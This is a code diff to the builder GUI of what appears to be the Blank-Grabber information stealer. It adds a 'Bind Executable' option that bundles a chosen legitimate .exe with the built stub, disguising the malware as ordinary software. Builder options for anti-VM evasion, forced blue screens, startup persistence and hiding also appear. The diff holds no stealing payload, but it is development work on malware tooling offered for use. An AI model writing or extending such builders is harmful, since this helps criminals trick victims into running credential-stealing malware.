@@ -16,6 +16,7 @@ class Builder:
 	def __init__(self):
 		self.root = tk.Tk()
 		self.iconFileData = bytes()
+		self.boundFileData = bytes()
 		self.PingME = tk.BooleanVar(self.root, True)
 		self.VMprotect = tk.BooleanVar(self.root, True)
 		self.BSOD = tk.BooleanVar(self.root, True)
@@ -53,11 +54,17 @@ class Builder:
 		Startup.place(y= 230, x= 20)
 		Hide.place(y= 260, x= 20)
 
-		FileNameLabel = ttk.Label(background= "black", foreground= "white", font= ("Franklin Gothic", 10, "bold"))
-		FileNameLabel.place(x= 560, y= 130, anchor= "n")
-		FileNameLabel.bind("<ButtonRelease-1>", lambda event: self.unselectIcon(event))
-		IconButton = tk.Button(text= "Select Icon", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font= ("Franklin Gothic", 10, "bold"), command= lambda: self.selectIcon(FileNameLabel))
-		IconButton.place(x= 630, y= 110, anchor= "e")
+		IconNameLabel = ttk.Label(background= "black", foreground= "white", font= ("Franklin Gothic", 10, "bold"), width= 15, anchor= "center")
+		IconNameLabel.place(x= 560, y= 130, anchor= "e")
+		IconNameLabel.bind("<ButtonRelease-1>", lambda event: self.unselectIcon(event))
+		IconButton = tk.Button(text= "Select Icon", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font= ("Franklin Gothic", 10, "bold"), command= lambda: self.selectIcon(IconNameLabel))
+		IconButton.place(x= 560, y= 110, anchor= "e")
+
+		BoundFileNameLabel = ttk.Label(background= "black", foreground= "white", font= ("Franklin Gothic", 10, "bold"), width= 15, anchor= "center")
+		BoundFileNameLabel.place(x= 560, y= 200, anchor= "e")
+		BoundFileNameLabel.bind("<ButtonRelease-1>", lambda event: self.unBind(event))
+		BindButton = tk.Button(text= "Bind Executable", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font= ("Franklin Gothic", 10, "bold"), command= lambda: self.BindFileSelect(BoundFileNameLabel))
+		BindButton.place(x= 560, y= 180, anchor= "e")
 
 		GithubButton = tk.Button(text= "Github", background= "#303841", foreground= "white", activebackground= "#303841", activeforeground= "white", width= "15", font= ("Franklin Gothic", 10, "bold"), command= lambda: webbrowser.open("https://github.com/Blank-c/Blank-Grabber", new= 2))
 		GithubButton.place(x= 770, y= 180, anchor= "e")
@@ -88,6 +95,7 @@ class Builder:
 	
 		ToggleConsole(True)
 		self.root.destroy()
+		ctypes.windll.user32.FlashWindow(ctypes.windll.kernel32.GetConsoleWindow(), True )
 		clear()
 
 		if not os.path.isfile(os.path.join("env", "Scripts", "run.bat")):
@@ -117,9 +125,14 @@ class Builder:
 		#print("\u001b[0m", end= "", flush= True)
 		if os.path.isfile("icon.ico"):
 			os.rename("icon.ico", "icon.ico.old")
+		if os.path.isfile("bound.exe"):
+			os.rename("bound.exe", "bound.exe.old")
 		if len(self.iconFileData):
 			with open("icon.ico", "wb") as file:
 				file.write(self.iconFileData)
+		if len(self.boundFileData):
+			with open("bound.exe", "wb") as file:
+				file.write(self.boundFileData)
 		os.startfile("run.bat")
 
 	def checkInternetConnection(self):
@@ -133,15 +146,29 @@ class Builder:
 		filetypes = (
 			("Icon File", ".ico"),
 			)
-		fileloc = filedialog.askopenfilename(title= "Select stub icon", initialdir= os.path.join(os.getenv("userprofile"), "Pictures"), filetypes= filetypes)
+		fileloc = filedialog.askopenfilename(title= "Select icon", initialdir= os.path.join(os.getenv("userprofile"), "Pictures"), filetypes= filetypes)
 		if os.path.isfile(fileloc):
 			with open(fileloc, "rb") as file:
 				self.iconFileData = file.read()
+			FileNameLabel['text'] = os.path.basename(fileloc)
+	
+	def BindFileSelect(self, FileNameLabel):
+		filetypes = (
+			("Executable File", ".exe"),
+			)
+		fileloc = filedialog.askopenfilename(title= "Select file", initialdir= ".", filetypes= filetypes)
+		if os.path.isfile(fileloc):
+			with open(fileloc, "rb") as file:
+				self.boundFileData = file.read()
 			FileNameLabel['text'] = os.path.basename(fileloc)
 
 	def unselectIcon(self, event):
 		event.widget['text'] = str()
 		self.iconFileData = bytes()
+
+	def unBind(self, event):
+		event.widget['text'] = str()
+		self.boundFileData = bytes()
 
 	def ToggleBsod(self, BSOD):
 		if not self.VMprotect.get():
